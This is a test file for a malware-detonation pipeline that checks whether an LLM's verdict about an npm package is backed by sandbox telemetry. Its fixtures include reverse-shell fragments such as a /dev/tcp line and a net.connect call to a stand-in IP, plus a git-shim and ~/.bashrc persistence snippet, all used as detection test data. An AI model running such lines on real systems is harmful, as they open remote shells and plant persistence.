import json
from pathlib import Path

import pytest

from brain.evidence import (
    Item,
    build_index,
    check,
    corpus_for,
    ids_by_source,
    uncited_claims,
    unsupported_mentions,
)
from brain.llm import Evidence, LlmOutcome, LlmVerdict, compact_telemetry, parse_response
from brain.pipeline import analyze
from brain.report import esc
from shared.contract import DetonateResult
from tests.test_intent import meta

FIXTURES = Path(__file__).parent / "fixtures"


def e4(job_id: str = "job-1") -> DetonateResult:
    res = DetonateResult.model_validate_json((FIXTURES / "detonate_result_e4.json").read_text())
    return res.model_copy(update={"job_id": job_id})


def verdict(*evidence: Evidence, observed="curl posted env to 203.0.113.10", explanation="x"):
    return LlmVerdict(verdict="malicious", confidence=0.9, stated_intent="s",
                      observed_behavior=observed, mismatch=True, explanation=explanation,
                      key_evidence=list(evidence))  # fmt: skip


def ev(event_type: str, refs=(), kind="observed") -> Evidence:
    return Evidence(event_type=event_type, kind=kind, refs=list(refs), detail="d",
                    why_it_matters="why")  # fmt: skip


def first(res: DetonateResult, source: str, containing: str = "") -> str:
    index = build_index(res)
    return next(i for i in ids_by_source(index)[source] if containing in index[i].text)


# --- ids ---


def test_ids_are_unique_stable_and_job_scoped():
    a, b = build_index(e4("job-1")), build_index(e4("job-1"))
    assert list(a) == list(b) and len(set(a)) == len(a)
    assert set(a).isdisjoint(build_index(e4("job-2")))  # another job's ids never match


def test_prompt_telemetry_carries_the_same_ids():
    res = e4()
    data = json.loads(compact_telemetry(res))
    shown = [e["id"] for e in data["exec"]] + [c["id"] for c in data["connect"]]
    shown += [d["id"] for d in data["dns"]]
    assert shown and set(shown) <= set(build_index(res))


# --- checking claims ---


def test_cited_runtime_event_is_supported_and_rendered_from_the_record():
    res = e4()
    raw_ip = first(res, "connect", "203.0.113.10")
    g = check(verdict(ev("connect", [raw_ip])), build_index(res), "")
    assert len(g.supported) == 1 and not g.rejected
    assert "203.0.113.10" in g.supported[0].items[0].text  # the kernel's text, not the model's


def test_invented_id_is_rejected():
    g = check(verdict(ev("exec", ["x000000"])), build_index(e4()), "")
    assert not g.supported and "unknown event id" in g.rejected[0].reason


def test_id_planted_in_pr_text_from_another_job_is_rejected():
    planted = first(e4("attacker-guess"), "exec")
    res = e4("job-1")
    g = check(verdict(ev("exec", [planted])), build_index(res), corpus_for(res, planted))
    assert not g.supported and g.rejected


def test_wrong_type_or_missing_refs_is_not_support():
    res = e4()
    dns_id = first(res, "dns")
    g = check(verdict(ev("exec", [dns_id]), ev("connect")), build_index(res), "")
    assert not g.supported
    assert [r.reason for r in g.rejected] == ["cited events are the wrong type",
                                              "cites no runtime event"]  # fmt: skip


def test_source_inferred_is_kept_but_never_counted_as_observed():
    g = check(verdict(ev("exec", kind="source_inferred")), build_index(e4()), "")
    assert g.supported[0].kind == "source_inferred" and g.supported[0].items == ()
    assert g.summary()["source_inferred"] == 1


def test_recorded_pre_grounding_response_has_no_supported_claims():
    body = json.loads((FIXTURES / "llm" / "e4_muse_spark_1_3.json").read_text())
    v = parse_response(body)  # still parses: refs/kind have defaults
    g = check(v, build_index(e4()), corpus_for(e4(), ""))
    assert g.claims == 3 and g.supported == []


# --- mentions in the prose ---


def test_hallucinated_address_is_flagged_but_recorded_ones_are_not():
    res = e4()
    corpus = corpus_for(res, "+ fetch('https://cdn.example.org/x.js')")
    prose = ("curl sent data to 203.0.113.10 and also 198.51.100.7, then loaded "
             "cdn.example.org and evil-c2.example.net via postinstall.js")  # fmt: skip
    assert unsupported_mentions(prose, corpus) == ["198.51.100.7", "evil-c2.example.net"]


def test_file_names_are_not_hosts():
    assert unsupported_mentions("ran scripts/install.js and package.json", "") == []


# --- through the pipeline and into the report ---


def test_report_shows_supported_evidence_and_counts_the_rest():
    res = e4()
    good = ev("connect", [first(res, "connect")])
    bad = ev("exec", ["x123456"])
    v = verdict(good, bad, explanation="It also beaconed to 198.51.100.7.")

    def llm(*a, **k):
        return LlmOutcome("m", verdict=v)

    out = analyze(res, meta(), "", llm, job_id="j", enrich=lambda r: r)
    assert out.grounding.summary()["supported"] == 1 and out.grounding.summary()["rejected"] == 1
    assert "1 of 2 supported" in out.report
    assert "1 claim(s) left out" in out.report
    assert esc("198.51.100.7", 60) in out.report
    assert "neither the kernel record nor the diff" in out.report
    assert out.final.title == "Blocked"  # grounding never changes the verdict


def test_kernel_text_in_the_report_is_escaped():
    res = e4()
    hostile = res.exec_events[0].model_copy(update={"args": "<img src=x> @octocat"})
    res = res.model_copy(update={"exec_events": [hostile, *res.exec_events[1:]]})
    v = verdict(ev("exec", [first(res, "exec")]))
    out = analyze(res, meta(), "", lambda *a, **k: LlmOutcome("m", verdict=v), job_id="j",
                  enrich=lambda r: r)  # fmt: skip
    assert "<img" not in out.report and "@octocat" not in out.report


# --- W4(b): uncited prose claims (file paths, ports) ---
# The key_evidence check only covers claims that cite an event. These cover the gap: a sentence
# that asserts a path or port with no citation, which a reader would otherwise take on trust.


def _idx():
    return {"c1": Item("c1", "connect", "/usr/local/bin/node -> tcp:203.0.113.10:4444 (no DNS)")}


_CORPUS = (
    "/work/node_modules/color-helper/install.js\n/usr/local/bin/node\n"
    "203.0.113.10\n/home/runner/.npmrc"
)


@pytest.mark.parametrize(
    "prose, expected",
    [
        ("it ran /work/node_modules/color-helper/install.js", []),
        ("it appended to ~/.bashrc for persistence", ["~/.bashrc"]),
        ("connected to port 4444", []),
        ("opened a listener on port 31337", ["port 31337"]),
        ("it read ~/.npmrc and exfiltrated it", []),  # that path IS on record
        ("it wrote into /tmp and /work", []),  # too generic to be a claim
        ("spawned /usr/local/bin/node", []),
    ],
)
def test_uncited_claims_flags_only_what_the_record_contradicts(prose, expected):
    assert uncited_claims(prose, _CORPUS, _idx()) == expected


@pytest.mark.parametrize(
    "corpus_line",
    [
        "+fs.writeFileSync(p, 'exec 3<>/dev/tcp/203.0.113.10/9000\\n', { mode: 0o755 });",
        '+  const s = require("net").connect(9000, "203.0.113.10");',
    ],
)
def test_a_port_written_without_a_colon_is_still_on_record(corpus_line):
    """Measured false positives: rt09 writes its port as `/dev/tcp/<ip>/9000` and rt10 as
    `connect(4444, host)`. Looking only for `:9000` flagged 33 of 420 analyses as uncited while
    the model was describing the diff accurately."""
    assert uncited_claims("it dialed port 9000", corpus_line, {}) == []


def test_a_flagged_port_is_reported_once():
    """`port not in found` compared a bare port against labels like "port 9000", so a port named
    twice in the prose was listed twice."""
    prose = "it opened port 31337 and then port 31337 again"
    assert uncited_claims(prose, _CORPUS, _idx()) == ["port 31337"]


def test_uncited_claims_appear_in_the_summary():
    v = verdict(observed="it appended to ~/.bashrc", explanation="persistence")
    g = check(v, _idx(), _CORPUS)
    assert g.summary()["uncited"] == 1
    assert "~/.bashrc" in g.uncited


# --- W4(b): path false positives found by running the check over the held-out blind corpus ---
# bc09-path-shadow was the one uncited fire across the committed post-fix telemetry
# (eval/blind_model_arm.json), and hand-auditing it against eval/blind_telemetry/bc09-path-shadow
# showed it was a false positive: the payload builds its path from separate string literals and
# the model described the real path. These pin the two root causes so they cannot come back.

# The exact lines from bc09's executed script (eval/blind_telemetry/bc09-path-shadow.json):
# the git shim path never appears as one contiguous string, only as path.join(...) pieces.
_BC09_SOURCE = (
    'const bin = path.join(os.homedir(), ".local", "bin");\n'
    'fs.writeFileSync(path.join(bin, "git"), shim, { mode: 0o755 });\n'
    'fs.appendFileSync(path.join(os.homedir(), ".bashrc"), exportLine);'
)


@pytest.mark.parametrize(
    "prose",
    [
        "it dropped a git shim at ~/.local/bin/git",
        "it installed a fake git at /home/runner/.local/bin/git",
        "it wrote `~/.local/bin/git` to shadow the real binary",
    ],
)
def test_a_path_assembled_by_path_join_is_still_on_record(prose):
    """bc09: `path.join(os.homedir(), ".local", "bin")` + `path.join(bin, "git")` never writes
    `~/.local/bin/git` as one string, so the contiguous-substring check flagged the model for
    naming the real path. A path is now on record when every segment is a token in the corpus -
    the same looseness the port check already uses for `/dev/tcp/<ip>/9000`."""
    assert uncited_claims(prose, _BC09_SOURCE, {}) == []


def test_trailing_sentence_punctuation_is_not_part_of_the_path():
    """A path ending a clause keeps the sentence's '.', which made an on-record path look invented
    (`~/.bashrc.` is not in the corpus, `~/.bashrc` is). Also seen on bc09."""
    corpus = "/home/runner/.bashrc\n/home/runner/.npmrc"
    assert uncited_claims("it then modified ~/.bashrc.", corpus, {}) == []
    assert uncited_claims("it edited ~/.npmrc, then exited.", corpus, {}) == []


def test_a_path_whose_distinctive_segment_is_absent_is_still_flagged():
    """The segment looseness must not swallow a real catch. Even when one segment of the path IS
    in the corpus (`.local`), a path whose other segment the record never mentions is still an
    uncited claim - every segment must match, not merely one of them."""
    # `.local` is a token in _BC09_SOURCE; `credentials` and `.ssh`/`authorized_keys` are not.
    assert uncited_claims("it exfiltrated ~/.local/credentials", _BC09_SOURCE, {}) == [
        "~/.local/credentials"
    ]
    assert uncited_claims("it wrote ~/.ssh/authorized_keys", _BC09_SOURCE, {}) == [
        "~/.ssh/authorized_keys"
    ]


def test_a_segment_matches_as_a_token_not_a_coincidental_substring():
    """Segment matching is by token, not raw substring: `git` must not be satisfied by the `git`
    buried inside `digits`, or the looseness would let almost any path with a short common segment
    slip through. `/etc/git` is flagged even though both letters-sequences appear as substrings."""
    corpus = "install hashed 64 digits of state under /etc/ssl/certs"
    assert uncited_claims("it planted /etc/git", corpus, {}) == ["/etc/git"]


def test_planted_false_prose_is_flagged_for_both_a_path_and_a_port():
    """The regression guard has to be shown to fire: plant a verdict claiming it wrote `~/.bashrc`
    and used `port 4444` against a record that contains neither, and assert both are caught. This
    is the 'non-trivial count when there is something to catch' half of the W4(b) acceptance - a
    check that reports 0 on an actual falsehood would not be checking anything."""
    corpus = "/work/node_modules/leftpad/index.js\n/usr/local/bin/node\nregistry.npmjs.org"
    v = verdict(
        observed="it appended a backdoor to ~/.bashrc",
        explanation="then opened a reverse shell on port 4444",
    )
    g = check(v, {}, corpus)
    assert sorted(g.uncited) == ["port 4444", "~/.bashrc"]
    assert g.summary()["uncited"] == 2
